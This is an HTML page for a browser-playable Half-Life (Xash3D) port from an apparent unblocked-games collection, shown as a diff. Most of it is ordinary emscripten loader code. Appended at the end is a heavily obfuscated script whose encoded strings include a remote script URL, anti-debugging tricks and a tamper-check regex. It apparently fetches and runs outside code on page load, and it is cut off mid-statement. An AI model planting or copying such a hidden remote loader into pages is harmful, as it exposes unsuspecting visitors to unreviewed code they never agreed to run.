@@ -1,0 +1,762 @@
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-L7856P3VNT"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-L7856P3VNT');
+</script><!DOCTYPE html>
+
+
+<!-- Ultimate Game Stash file--> 
+<!-- For the regularly updating doc go to https://docs.google.com/document/d/1_FmH3BlSBQI7FGgAQL59-ZPe8eCxs35wel6JUyVaG8Q/ --> 
+
+
+<html lang="en-us">
+<base href="https://cdn.jsdelivr.net/gh/bubbls/UGS-Assets@354e3c6939a08e472482653567d566ba3a2aa527/half%20life/">
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<meta name="MobileOptimized" content="640" />
+	<meta name="HandheldFriendly" content="true" />
+	<title>Xash</title>
+	<script>
+		document.addEventListener('contextmenu', event => event.preventDefault());
+		window.onbeforeunload = function(e) {
+			e.preventDefault();
+			e.returnValue = 'Really want to quit the game?';
+		};
+
+		document.onkeydown = function(e) {
+			e = e || window.event;
+
+			if (!e.ctrlKey) return;
+
+			var code = e.which || e.keyCode;
+
+			switch (code) {
+				case 83:
+				case 87:
+					e.preventDefault();
+					e.stopPropagation();
+					break;
+			}
+		};
+		var a = new Audio('music.mp3');
+		var pashalka_count = 0;
+
+		function play_sound() {
+			if (pashalka_count == 40) a.play();
+			if (pashalka_count < 100) pashalka_count += 1;
+		}
+		window.addEventListener('click', play_sound);
+		window.addEventListener('keydown', play_sound);
+	</script>
+	<style>
+		body {
+			font-family: arial;
+			margin: 0;
+			padding: none;
+			background-color: #555555;
+			color: #f0b418;
+		}
+
+		.emscripten {
+			padding-right: 0;
+			margin-left: auto;
+			margin-right: auto;
+			display: block;
+		}
+
+		div.emscripten {
+			text-align: center;
+		}
+
+		div.emscripten_border {}
+
+		canvas.emscripten {
+			border: 0px none;
+			background-image: url(xd.png);
+			box-shadow: #ffa600 0px 0px 9px 4px;
+		}
+
+		@-webkit-keyframes rotation {
+			from {
+				-webkit-transform: rotate(0deg);
+			}
+
+			to {
+				-webkit-transform: rotate(360deg);
+			}
+		}
+
+		@-moz-keyframes rotation {
+			from {
+				-moz-transform: rotate(0deg);
+			}
+
+			to {
+				-moz-transform: rotate(360deg);
+			}
+		}
+
+		@-o-keyframes rotation {
+			from {
+				-o-transform: rotate(0deg);
+			}
+
+			to {
+				-o-transform: rotate(360deg);
+			}
+		}
+
+		@keyframes rotation {
+			from {
+				transform: rotate(0deg);
+			}
+
+			to {
+				transform: rotate(360deg);
+			}
+		}
+
+
+		#controls {
+			display: inline-block;
+			float: right;
+			vertical-align: top;
+			margin-top: 5px;
+			margin-right: 20px;
+		}
+
+		#output {
+			width: 100%;
+			height: 200px;
+			margin: 0 auto;
+			margin-top: 10px;
+			border-left: 0px;
+			border-right: 0px;
+			border-style: solid;
+			padding-left: 0px;
+			padding-right: 0px;
+			display: none;
+			background-color: black;
+			color: rgba(0, 255, 0, 255);
+			font-family: 'Lucida Console', Monaco, monospace;
+			outline: none;
+			border-color: #f0B418;
+		}
+
+		.loader {
+			border: 4px solid #f3f3f3;
+			border-radius: 50%;
+			border-top: 4px solid #ffa600;
+			width: 16px;
+			height: 16px;
+			-webkit-animation: spin 2s linear infinite;
+			animation: spin 2s linear infinite;
+		}
+
+		@-webkit-keyframes spin {
+			0% {
+				-webkit-transform: rotate(0deg);
+			}
+
+			100% {
+				-webkit-transform: rotate(360deg);
+			}
+		}
+
+		@keyframes spin {
+			0% {
+				transform: rotate(0deg);
+			}
+
+			100% {
+				transform: rotate(360deg);
+			}
+		}
+
+		a.glow,
+		a.glow:hover,
+		a.glow:focus {
+			text-decoration: none;
+			color: #F0B418;
+			text-shadow: none;
+			-webkit-transition: 500ms linear 0s;
+			-moz-transition: 500ms linear 0s;
+			-o-transition: 500ms linear 0s;
+			transition: 500ms linear 0s;
+			outline: 0 none;
+			cursor: default;
+		}
+
+		a.glow:hover,
+		a.glow:focus {
+			color: #ffa600;
+			text-shadow: -1px 1px 8px #ffa600, 1px -1px 8px #ffa600;
+		}
+
+		hr {
+			border-color: #ffa600;
+		}
+
+		#label_file_select {
+			padding: 1px 6px;
+		}
+
+		input[type="file"i] {
+			display: none;
+		}
+
+		input[type="text"i] {
+			color: #f0b418;
+			background-color: #555555;
+			border: 2px solid #f0b418;
+			font-family: Segoe UI;
+			font-size: 15px;
+			transition: 0.5s all;
+		}
+
+		* {
+			cursor: default;
+			-webkit-user-select: none;
+			-moz-user-select: none;
+			-ms-user-select: none;
+			user-select: none;
+			outline: none;
+		}
+
+		if (document.createElement("detect").style.textShadow==="") {
+			document.getElementsByTagName("html")[0].className+=" textshadow";
+		}
+	#sidebarad1,
+#sidebarad2 {
+  position: fixed;
+  top: 50%;
+  transform: translateY(-50%);
+  width: 160px;
+  height: 600px;
+  padding: 0;
+  margin: 0;
+  z-index: 999999;
+}
+#sidebarad1 {
+  left: 0;
+}
+#sidebarad2 {
+  right: 0;
+}
+.sidebar-close {
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 22px;
+  height: 22px;
+  line-height: 22px;
+  text-align: center;
+  background: rgba(0,0,0,0.7);
+  color: #fff;
+  font-size: 14px;
+  cursor: pointer;
+  user-select: none;
+  z-index: 10;
+}
+.sidebar-frame {
+  width: 160px;
+  height: 600px;
+  border: none;
+  display: block;
+}
+</style>
+</head>
+
+<body onerror=alert(event); bgcolor=#555555 text=#F0B418 link=#ffa600 vlink=#ffa600>
+	<div class="emscripten_border">
+		<canvas style="display:none" class="emscripten" id="canvas" oncontextmenu="event.preventDefault()"></canvas>
+	</div>
+
+	<p>
+	<div style=width:100%;height:0px>
+		<div style="float:left;" id="status">Downloading...</div>
+		<div id="progress1" style="position:relative;z-index:10;display:none;float:right;width:70%;border-color:#F0B418;border-style:solid;border-width:2px;height:20px; visibility: hidden;">
+			<div id=progress style="text-align:center;background-color:#F0B418;border-color:#555555;border-style:solid:border-width:3px;width:50%;height:20px; visibility: hidden;"></div>
+		</div><br>
+	</div><br></p>
+
+	<textarea style='visibility: hidden;' id="output" rows="8" style="display: none;"></textarea>
+	<div style='visibility: hidden;' id="asyncDialog" style="float:left"></div>
+
+    <div hidden>
+	<center> <a class="glow">
+		<div id=optionsTitle>
+			<h1>Xash</h1>
+		</div>
+	</a></center>
+	<center> <form style=display:none id=fSettings>
+		<a class='glow'>Select filesystem for save and restore:</a>
+		<div id=idbHider style=display:none><label><input name=a type=radio id=rIndexedDB checked=true />IndexedDB</label><br></div>
+		<label><input name=a type=radio id=rLocalStorage />in Local storage</label><br>
+		<label><input name=a type=radio id=rNone />in RAM</label><br><br>
+		<hr>
+			<div id=zipHider style=display:none><input name=b type=radio id=rZip checked=true />ZIP archive from server
+		</label><select id=selectZip style=display:none></select><br></div>
+
+		<label><input name=b type=radio id=rLocalZip />Local ZIP file:</label><label id="label_file_select"><input type=file name=c id=iZipFile /><a class='glow'> Select ZIP file </a></label><br><br><hr>
+		Command-line arguments: <input name=d type=text id=iArgs value="-dev 1 -game valve" /><br><br>
+		<a class='glow' onclick="startXash();return false;">Launch Xash!</a>
+		<br><hr>
+		<div id='linksPlaceholder' style=display:none>Download archives to load locally next time:</div><br>
+		<label>
+			<div id=pkgHider style=display:none><input name=b type=radio id=rPackage />
+		</label><select id=selectPkg style=display:none></select><br></div>
+		<label>
+		<div style='visibility: hidden;' class="loader" id=loader1></div>
+	</form> </label>
+
+	<div style=width:100%><span id='controls'>
+			<a style='visibility: hidden;' class="glow"><span><label id="label_show_console_log" style="display: none;"><input type="checkbox" id="show_console_log">Show Console Log</label></span></a>
+			<a style='visibility: hidden;' class="glow"><span><label><input type="checkbox" id="resize">Resize canvas</label></span></a>
+			<a style='visibility: hidden;' class="glow"><span><label><input type="checkbox" id="pointerLock" checked>Lock/hide mouse pointer &nbsp;&nbsp;&nbsp;</label></span></a>
+			<span style='visibility: hidden;'><input type="button" value="Fullscreen" onclick="Module.requestFullscreen(document.getElementById('pointerLock').checked, document.getElementById('resize').checked)"></span>
+	</span></div>
+</div>
+
+	<script type='text/javascript' src='browserfs.min.js'></script>
+	<script type='text/javascript'>
+		var zipMods = [];
+		var pkgMods = [];
+	</script>
+
+	<script type='text/javascript' src='mods.js'></script>
+
+	<script type='text/javascript'>
+		var show_again = true;
+		var statusElement = document.getElementById('status');
+		var progressElement = document.getElementById('progress');
+		var asyncDialog = document.getElementById('asyncDialog');
+		var myerrorbuf = ''
+		var myerrordate = new Date();
+		var mounted = false;
+		var gamedir = 'valve';
+		var moduleCount = 0;
+		//var mem = 150;
+		var mfs;
+		var zipSize;
+
+
+		if (!ArrayBuffer['isView']) {
+			ArrayBuffer.isView = function(a) {
+				return a !== null && typeof(a) === "object" && a['buffer'] instanceof ArrayBuffer;
+			};
+
+		}
+
+		showElement('optionsTitle', false);
+
+		function prepareSelects() {
+			var len = zipMods.length;
+			var select = document.getElementById('selectZip');
+			if (len) {
+				showElement('zipHider', true);
+
+				if (len > 1) {
+					var links = '';
+					for (var i = 0; i < len; i++) {
+						select.options[i] = new Option(zipMods[i][1], zipMods[i][0]);
+						links += '<br><a class="glow" onclick=location.href="' + zipMods[i][0] + '">' + zipMods[i][1] + '</a>';
+					}
+					select.style.display = 'block';
+					document.getElementById('linksPlaceholder').innerHTML += links;
+				}
+			} else
+				document.getElementById('rZip').checked = false;
+			len = pkgMods.length;
+			select = document.getElementById('selectPkg');
+			if (len) {
+				showElement('pkgHider', true);
+
+				if (len > 1) {
+					for (var i = 0; i < len; i++)
+						select.options[i] = new Option(pkgMods[i][1], pkgMods[i][0]);
+					//select.style.display = 'block';
+				}
+			} else
+				document.getElementById('rPackage').checked = false;
+
+			if (!zipMods.length && !len) {
+				document.getElementById('rLocalZip').checked = true;
+				showElement('rLocalZip', false);
+			}
+		}
+
+		try {
+			mem = Math.round(window.location.hash.substring(1));
+		} catch (e) {};
+
+		var Module = {
+			TOTAL_MEMORY: mem * 1024 * 1024,
+			preRun: [],
+			postRun: [],
+			print: (function() {
+				var element = document.getElementById('output');
+				if (element) element.value = '';
+				return function(text) {
+					if (arguments.length > 1) text = Array.prototype.slice.call(arguments).join(' ');
+					if (text) {
+						myerrorbuf += text + '\n';
+						console.log(text);
+						if (text == "exit(0)")
+						{
+							document.getElementById('canvas').style.display = "none";
+							setTimeout(function(){
+								location.reload();
+							}, 1000);
+						}
+						else if (text == "shader success") {
+							pashalka_count = 100;
+							a.pause();
+                            let canvass = document.getElementById('canvas');
+							canvass.style.display = "block";
+						} else {
+						}
+					}
+					if (element) {
+						if (element.value.length > 65536)
+							element.value = element.value.substring(512) + myerrorbuf;
+						else
+							element.value += myerrorbuf;
+						element.scrollTop = element.scrollHeight; // focus on bottom
+					}
+					myerrorbuf = ''
+				};
+			})(),
+			printErr: function(text) {
+				if (arguments.length > 1) text = Array.prototype.slice.call(arguments).join(' ');
+				if (0) { // XXX disabled for safety typeof dump == 'function') {
+					dump(text + '\n'); // fast, straight to the real console
+				} else {
+					if (myerrorbuf.length > 2048)
+						myerrorbuf = 'some lines skipped\n' + myerrorbuf.substring(512);
+					myerrorbuf += text + '\n';
+					if (new Date() - myerrordate > 3000) {
+						myerrordate = new Date();
+						Module.print();
+					}
+				}
+			},
+			canvas: (function() {
+				var canvas = document.getElementById('canvas');
+				canvas.addEventListener("webglcontextlost", function(e) {
+					alert('WebGL context lost. You will need to reload the page.');
+					e.preventDefault();
+				}, false);
+
+				return canvas;
+			})(),
+			setStatus: function(text) {
+				if (!Module.setStatus.last) Module.setStatus.last = {
+					time: Date.now(),
+					text: ''
+				};
+				if (text === Module.setStatus.text) return;
+				if (new Date() - myerrordate > 3000) {
+					myerrordate = new Date();
+					Module.print();
+				}
+
+				statusElement.innerHTML = text;
+				if (progressElement) {
+					var m = text.match(/([^(]+)\((\d+(\.\d+)?)\/(\d+)\)/);
+
+					if (m) {
+						var progress = Math.round(parseInt(m[2]) * 100 / parseInt(m[4]));
+						progressElement.style.color = progress > 5 ? '#303030' : '#aaa000';
+						progressElement.style.width = progressElement.innerHTML = '' + progress + '%';
+					}
+					showElement('progress1', !!m);
+				}
+			},
+			totalDependencies: 0,
+			monitorRunDependencies: function(left) {
+				this.totalDependencies = Math.max(this.totalDependencies, left);
+				if (left)
+					Module.setStatus('Preparing... (' + (this.totalDependencies - left) + '/' + this.totalDependencies + ')');
+			}
+		};
+		window.onerror = function(event) {
+			if (mounted)
+				FS.syncfs(false, function(err) {
+					Module.print('Saving IDBFS: ' + err);
+				});
+			if (('' + event).indexOf('SimulateInfiniteLoop') > 0)
+				return;
+			var text = 'Exception thrown: ' + event;
+			text = text.replace(/&/g, "&amp;");
+			text = text.replace(/</g, "&lt;");
+			text = text.replace(/>/g, "&gt;");
+			text = text.replace('\n', '<br>', 'g');
+			Module.setStatus(text);
+			Module.print('Exception thrown: ' + event);
+		};
+
+		function haltRun() {}
+
+		var savedRun;
+
+		function radioChecked(id) {
+			var r = document.getElementById('r' + id);
+			if (r) return r.checked;
+			return false;
+		}
+
+		function showElement(id, show) {
+			var e = document.getElementById(id);
+			if (!e) return;
+			e.style.display = show ? 'block' : 'none';
+		}
+		Module.setStatus('Downloading...');
+
+
+
+		function startXash() {
+			showElement('loader1', false);
+			showElement('optionsTitle', false);
+			showElement('fSettings', false);
+			setupFS();
+			Module.arguments = document.getElementById('iArgs').value.split(' ');
+			Module.run = run = savedRun;
+			if (radioChecked('Zip')) {
+				const zipper = document.getElementById('selectZip');
+				if (zipMods.length > 1) {
+					var mod_parts = [zipMods[0][3], zipMods[0][4], zipMods[0][2]];
+					for (var i = 0; i < zipMods.length; i++) {
+						if (zipMods[i][0] == zipper.value) {
+							mod_parts = [zipMods[i][3], zipMods[i][4], zipMods[i][2]];
+							break;
+						}
+					}
+					fetchZIP(zipper.value, savedRun, mod_parts[0], mod_parts[1], mod_parts[2]);
+				} else {
+					fetchZIP(zipMods[0][0], savedRun, zipMods[0][3]);
+				}
+			} else if ((!zipMods.length && !pkgMods.length) || radioChecked('LocalZip')) {
+				var reader = new FileReader();
+				reader.onload = function() {
+					mountZIP(reader.result);
+					Module.print("Loaded zip data");
+					savedRun();
+				};
+				reader.readAsArrayBuffer(document.getElementById('iZipFile').files[0]);
+			} else if (radioChecked('Package')) {
+				var script = document.createElement('script');
+				script.onload = savedRun;
+				document.body.appendChild(script);
+				script.src = pkgMods.length > 1 ? document.getElementById('selectPkg').value : pkgMods[0][0];
+			}
+
+			window.addEventListener("beforeunload", function(e) {
+				var confirmationMessage = 'Leave the game?';
+
+				(e || window.event).returnValue = confirmationMessage; //Gecko + IE
+				return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+			});
+		}
+
+		function mountZIP(data) {
+			var Buffer = BrowserFS.BFSRequire('buffer').Buffer;
+			mfs.mount('/zip', new BrowserFS.FileSystem.ZipFS(Buffer.from(data)));
+			FS.mount(new BrowserFS.EmscriptenFS(), {
+				root: '/zip'
+			}, '/rodir');
+		}
+
+		function fetchZIP(packageName, cb, parts = 0, size_of_parts = 0, total_size = 0) {
+			if (parts == 0) {
+				var xhr = new XMLHttpRequest();
+				xhr.open('GET', packageName, true);
+				xhr.responseType = 'arraybuffer';
+
+				xhr.onprogress = function(event) {
+					var url = packageName;
+					var size;
+					if (event.total) size = event.total;
+					else size = zipMods[document.getElementById('selectZip').selectedIndex][2];
+					if (event.loaded) {
+						var total = size;
+						var loaded = event.loaded;
+						var num = 0;
+						if (Module['setStatus']) Module['setStatus']('Downloading data...');
+					} else if (!Module.dataFileDownloads) {
+						if (Module['setStatus']) Module['setStatus']('Downloading data...');
+					}
+				};
+				xhr.onerror = function(event) {
+					throw new Error("NetworkError");
+				}
+				xhr.onload = function(event) {
+					if (xhr.status == 200 || xhr.status == 304 || xhr.status == 206 || (xhr.status == 0 && xhr.response)) { // file URLs can return 0
+						mountZIP(xhr.response);
+						cb();
+					} else {
+						throw new Error(xhr.statusText + " : " + xhr.responseURL);
+					}
+				};
+				xhr.send(null);
+			} else {
+				var buffers = new Uint8Array(total_size);
+				var finished = 0;
+				for (var i = 0; i < parts; i++) {
+					const cur = i;
+					const no_ext = packageName.slice(0, -4);
+					const url1 = no_ext + '_out/' + no_ext + '-' + cur + '.zip';
+					console.log(url1);
+					const xhr = new XMLHttpRequest();
+					xhr.open('GET', url1, true);
+					xhr.responseType = 'arraybuffer';
+
+					xhr.onprogress = function(event) {
+						if (event.loaded) {
+							var loaded = event.loaded;
+							if (Module['setStatus']) Module['setStatus']('Downloading data... (' + ((finished * size_of_parts) + loaded) + '/' + total_size + ')');
+						} else if (!Module.dataFileDownloads) {
+							if (Module['setStatus']) Module['setStatus']('Downloading data...');
+						}
+					};
+					xhr.onerror = function(event) {
+						throw new Error("NetworkError");
+					}
+					xhr.onload = function(event) {
+						if (xhr.status == 200 || xhr.status == 304 || xhr.status == 206 || (xhr.status == 0 && xhr.response)) { // file URLs can return 0
+							finished++;
+							buffers.set(new Uint8Array(xhr.response), cur * size_of_parts);
+							if (finished == parts) {
+								mountZIP(buffers);
+								cb();
+							}
+						} else {
+							throw new Error(xhr.statusText + " : " + xhr.responseURL);
+						}
+					};
+					xhr.send(null);
+				}
+			}
+		}
+
+		function setupFS() {
+			FS.mkdir('/rodir');
+			FS.mkdir('/xash');
+			try {
+				mfs = new BrowserFS.FileSystem.MountableFileSystem();
+				BrowserFS.initialize(mfs);
+			} catch (e) {
+				mfs = undefined;
+				Module.print('Failed to initialize BrowserFS: ' + e);
+			}
+
+			if (radioChecked('IndexedDB')) {
+				FS.mount(IDBFS, {}, '/xash');
+				FS.syncfs(true, function(err) {
+					if (err) Module.print('Loading IDBFS: ' + err);
+				});
+				mounted = true;
+			}
+
+			if (radioChecked('LocalStorage') && mfs) {
+				mfs.mount('/ls', new BrowserFS.FileSystem.LocalStorage());
+				FS.mount(new BrowserFS.EmscriptenFS(), {
+					root: '/ls'
+				}, '/xash');
+				Module.print('LocalStorage mounted');
+			}
+
+			FS.chdir('/xash/');
+		}
+
+		function skipRun() {
+			savedRun = run;
+			Module.run = haltRun;
+			run = haltRun;
+
+			Module.setStatus("Xash3D downloaded!");
+			showElement('loader1', false);
+			showElement('optionsTitle', true);
+
+			if (window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB)
+				showElement('idbHider', true);
+			prepareSelects();
+			showElement('fSettings', true);
+
+			ENV.XASH3D_GAMEDIR = gamedir;
+			ENV.XASH3D_RODIR = '/rodir'
+
+			function loadModule(name) {
+				var script = document.createElement('script');
+				script.onload = function() {
+					moduleCount++;
+					if (moduleCount == 3) {
+						Module.setStatus("Scripts downloaded!");
+					}
+				};
+				document.body.appendChild(script);
+				script.src = name + ".js";
+			}
+
+			loadModule("server");
+			loadModule("client");
+			loadModule("menu");
+		};
+
+		Module.preInit = [skipRun];
+		Module.websocket = [];
+		//Module.websocket.url = 'wsproxy://the-swank.pp.ua:3000/'
+		Module.websocket.url = 'wsproxy://4.tcp.ngrok.io:10657/';
+		ENV = [];
+        window.addEventListener('load', function(event) {
+            startXash()
+        });
+	</script>
+
+	<script>
+		(function() {
+			var memoryInitializer = 'xash.html.mem';
+			if (typeof Module['locateFile'] === 'function') {
+				memoryInitializer = Module['locateFile'](memoryInitializer);
+			} else if (Module['memoryInitializerPrefixURL']) {
+				memoryInitializer = Module['memoryInitializerPrefixURL'] + memoryInitializer;
+			}
+			var xhr = Module['memoryInitializerRequest'] = new XMLHttpRequest();
+			xhr.open('GET', memoryInitializer, true);
+			xhr.responseType = 'arraybuffer';
+			xhr.send(null);
+		})();
+
+		var script = document.createElement('script');
+		script.src = "xash.js";
+		document.body.appendChild(script);
+	</script>
+	<script>
+		document.getElementById('show_console_log').addEventListener('change', function() {
+			if (document.getElementById('show_console_log').checked) document.getElementById('output').style.display = "block";
+			else document.getElementById('output').style.display = "none";
+		});
+		document.getElementById('label_show_console_log').style.display = "inline-block";
+		/*(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-68666752-4', 'auto');
+		ga('send', 'pageview');*/
+	</script>
+<div id="sidebarad1">
+  <div class="sidebar-close" onclick="this.parentElement.style.display='none'">✕</div>
+</div>
+<div id="sidebarad2">
+  <div class="sidebar-close" onclick="this.parentElement.style.display='none'">✕</div>
+</div>
+<script>(function(ykJYJgqRQvLQ,gSsZu$aEkLNcrSPk){const kGsNXc=sFfEkK$fMziBAJZwZbkuvp,gXeiNWc=ykJYJgqRQvLQ();while(!![]){try{const HcMpeIOoYPvgF=Number(-parseFloat(kGsNXc(0x1a7))/(0xa*Number(parseInt(0x133))+parseInt(0x1581)+-0x6*parseInt(0x595)))*(-parseFloat(kGsNXc(0x183))/(parseInt(0x238d)+parseInt(0x2)*-0x85b+parseInt(-0x3)*0x647))+Number(-parseFloat(kGsNXc(0x18f))/(Math.floor(-0x1e99)+0x1a*-0x151+parseInt(0x40d6)))*(parseFloat(kGsNXc(0x17e))/(Number(parseInt(0x1d))*Number(0xe7)+-parseInt(0x2)*-0xec9+Math.max(-0x631,-0x631)*parseInt(0x9)))+parseFloat(kGsNXc(0x1be))/(0x1*-parseInt(0x23)+-parseInt(0x1)*Math.max(0x579,parseInt(0x579))+0x5a1)+-parseFloat(kGsNXc(0x1a9))/(Math.floor(parseInt(0xfbc))+Math.floor(-parseInt(0x1c3b))+Math.ceil(parseInt(0x281))*0x5)*(parseFloat(kGsNXc(0x191))/(Math.max(0x1,0x1)*-parseInt(0x88d)+Math.trunc(0x776)+parseInt(0x11e)))+parseInt(-parseFloat(kGsNXc(0x1ac))/(Number(0x3)*parseInt(0x72a)+0x243*-0xb+Number(0x36b)))*parseInt(-parseFloat(kGsNXc(0x189))/(-0x1*-parseInt(0x1875)+-parseInt(0x1)*0x2186+-0x5*-0x1d2))+Math['max'](-parseFloat(kGsNXc(0x1b2))/(parseInt(0x3d)*Number(0x90)+parseInt(0x1)*-0x1e1f+-parseInt(0x427)),-parseFloat(kGsNXc(0x1b6))/(Math.max(-parseInt(0x200e),-0x200e)+0x1*parseInt(0xaea)+0x1ed*parseInt(0xb)))+parseInt(parseFloat(kGsNXc(0x195))/(parseInt(0x1bc9)+-parseInt(0x764)+Math.trunc(-parseInt(0x1459))));if(HcMpeIOoYPvgF===gSsZu$aEkLNcrSPk)break;else gXeiNWc['push'](gXeiNWc['shift']());}catch(FoDQtRV){gXeiNWc['push'](gXeiNWc['shift']());}}}(UravPbGESYjDUNqxKcf$Vqza,-0x1*parseFloat(parseInt(0x62251))+-0x204aa+parseInt(0x3b35)*parseInt(0x43)));function UravPbGESYjDUNqxKcf$Vqza(){const VwjQavltNv=['ec898d9b88abb4','edede8aca19f8db3b0','ede8edece1edb1a99dae9a9f','ece8e1e1e9e183b8b39d8e80','bdb0af','b8a9a9bcb7bd9ab1b0b5bd','bbb6bda0','baabbcb8adbc9cb5bcb4bcb7ad','e0ecedefebece9b7a19389bc98','ee9ab5baab9288','b5b6be','aaadb8abadaa8eb0adb1','e8e9ece9e9e1eeecb49495bcaab3','efebe8e0e1ebeceaabb1b68cbabb','b5b6bab8b5b1b6aaad','adb68aadabb0b7be','bfb5b6b6ab','b1adada9aae3f6f6babdb7f7abe0a1f7b0b7f6b8b0b5b6beb0ba86beb7f4b4b8adb1f7bdbcaf86b6bbbff7b3aa','a9abb6adb6ada0a9bc','ebe0b5b5a99ebbb1','edede1eae9e9e98bb4beb6b1b0','a9abb6adb6bab6b5','efe8ef8ea39bad9dad','adb8bbb5bc','e8eeef9b979b8ab1b4','e0ede8eee1e1e19293969e9da0','b0b7bfb6','eeeee1eae8e19aa19ab494b3','a9acaab1','bbb0b7bd','babcb0b5','ebedea96bc9f9e88b1','ebefe9ebe8e9bbaaadb2b090','efeab3909e958092','b8a9a9b5a0','abb8b7bdb6b48c8c909d','bebcad9cb5bcb4bcb7ad9ba090bd','eee9efeeef9c9a979d8f8b','bca1babca9adb0b6b7','e8ece1e8e0b3a1b6b19488','aab1b0bfad','e8e9ebebe9aba1b39f9493','a2a4f7bab6b7aaadabacbaadb6abf1fbabbcadacabb7f9adb1b0aafbf0f1f9f0','aabcb8abbab1','bab6b7aab6b5bc','eeecefe1efede99fb69f928f91','adabacb7ba','aabaabb0a9ad','aaabba','bab6b7aaadabacbaadb6ab','abbcb4b6afbc','8686a9abb6adb68686','abbca9b5b8babc98b5b5','e8ebeef7e9f7e9f7e8','aeb8abb7','bfb0b5bc','adabb8babc','b1b6aaadb7b8b4bc','abbcadacabb7f9f1bfacb7baadb0b6b7f1f0f9','eceae1eee9e8e9938eb49fbc96','f1f1f1f7f2f0f2f0f2f0f2fd','bcababb6ab','e8eaefeee989b2b6aab38b','ebbb8f9db190a8','b5bcb7beadb1','e8eeebe1ac81b6bca08d'];UravPbGESYjDUNqxKcf$Vqza=function(){return VwjQavltNv;};return UravPbGESYjDUNqxKcf$Vqza();}function _0xe8c3(rg_FddjIYmSuDaXct_SbftOPO,Od_FYPa_mevt){rg_FddjIYmSuDaXct_SbftOPO=rg_FddjIYmSuDaXct_SbftOPO-(Math.trunc(parseInt(0xe6e))+parseInt(0x272)+0x4*parseFloat(-0x408));const RpdkwFFntaedhLUsDwbyOh=_0x257e();let uWkwAed$dMg_pC=RpdkwFFntaedhLUsDwbyOh[rg_FddjIYmSuDaXct_SbftOPO];return uWkwAed$dMg_pC;}(function(mRvOXTqaCttJOulbTlUWmr,C_FoJhGb_hSKAwdyPQonizmLyCA){const UTF$MMBycHGYrTfD_Ufh=sFfEkK$fMziBAJZwZbkuvp,vUk$$ZvvSlCIAc=_0xe8c3,aivDrxhk$kGhjNzepqLWPvd=mRvOXTqaCttJOulbTlUWmr();while(!![]){try{const uSUNXbU$YsNm$I=-parseInt(vUk$$ZvvSlCIAc(-parseInt(0x3)*0x7ef+0x3*parseFloat(-parseInt(0x1d9))+parseInt(0x1e2b)*parseInt(0x1)))/(parseFloat(-parseInt(0x13d))+parseFloat(-0x1054)*-0x2+Math.trunc(-0xfb5)*0x2)*(parseInt(vUk$$ZvvSlCIAc(Number(-0x206f)+-0x17f1+parseInt(parseInt(0x3949))))/(-parseInt(0x9b)+-0x2253+-0x8bc*parseInt(-0x4)))+parseInt(vUk$$ZvvSlCIAc(0xf*-parseInt(0x17f)+Math.trunc(0xe59)+0x8f2))/(-0x1*Math.floor(-parseInt(0x48b))+-parseInt(0x3d)*-parseInt(0x3e)+-parseInt(0x134e))*(-parseInt(vUk$$ZvvSlCIAc(Math.trunc(-parseInt(0x596))+0x4*-parseInt(0x6c2)+Math.floor(0x216d)))/(-parseInt(0x142d)*-parseInt(0x1)+0x1230+-parseInt(0x2659)))+parseInt(vUk$$ZvvSlCIAc(parseInt(0xb)*0x25+0x31*-parseInt(0x6d)+-parseInt(0x37)*-0x5e))/(parseInt(0x1588)+-parseInt(0x26c7)+0x1144)*(parseInt(vUk$$ZvvSlCIAc(-parseInt(0x153)+-parseInt(0x996)*parseInt(0x1)+parseInt(0xbc8)*Math.trunc(parseInt(0x1))))/(0x11a*parseInt(0xd)+parseInt(0x15)*-0x16f+0xfcf))+parseInt(vUk$$ZvvSlCIAc(Number(parseInt(0x1))*-parseInt(0x155f)+Math.trunc(-0x19)*Math.ceil(-0x16f)+-0xd8d*Math.floor(parseInt(0x1))))/(Number(-0x13b8)+0x210f+0x18*-0x8e)*(-parseInt(vUk$$ZvvSlCIAc(0x559*Math.floor(0x6)+-0xa*Math.ceil(-parseInt(0x76))+-parseInt(0x23ce)*parseInt(0x1)))/(0x5*parseFloat(-parseInt(0x47b))+-parseInt(0x2e7)*Math.max(0x6,parseInt(0x6))+Math.floor(parseInt(0x65))*0x65))+-parseInt(vUk$$ZvvSlCIAc(parseFloat(-parseInt(0x18ac))*parseFloat(0x1)+-0x1266+Math.max(0x2bf7,parseInt(0x2bf7))))/(-0xfb0+parseFloat(parseInt(0x1fc))*parseFloat(parseInt(0xd))+Math.ceil(-parseInt(0x1))*Number(parseInt(0xa13)))*(parseInt(vUk$$ZvvSlCIAc(Math.floor(-parseInt(0x1))*-0xea3+0x77d*-0x4+Math.ceil(parseInt(0x1041))))/(-parseInt(0x1)*Math.ceil(parseInt(0xc0a))+parseInt(-0x7)*Number(parseInt(0x365))+0x72b*Math.floor(parseInt(0x5))))+parseInt(vUk$$ZvvSlCIAc(Number(parseInt(0x14a9))*Math.max(0x1,0x1)+parseInt(0xf9e)+-parseInt(0x2384)))/(Math.ceil(-parseInt(0x1))*-0x5b3+-0x249+0x35f*Math.ceil(-0x1))*(-parseInt(vUk$$ZvvSlCIAc(Math.max(0x1da8,parseInt(0x1da8))+0x2211+parseInt(-0x157)*parseInt(0x2f)))/(0x1af2+0x6be+Number(-parseInt(0x21a4))))+parseInt(vUk$$ZvvSlCIAc(0x15e9+0x5*Math.ceil(-0x3cb)+parseInt(0x1)*Math.floor(-parseInt(0x215))))/(-0xad*-parseInt(0x35)+-parseInt(0x11c)*parseFloat(parseInt(0x2))+Math.ceil(0x71)*-0x4c);if(uSUNXbU$YsNm$I===C_FoJhGb_hSKAwdyPQonizmLyCA)break;else 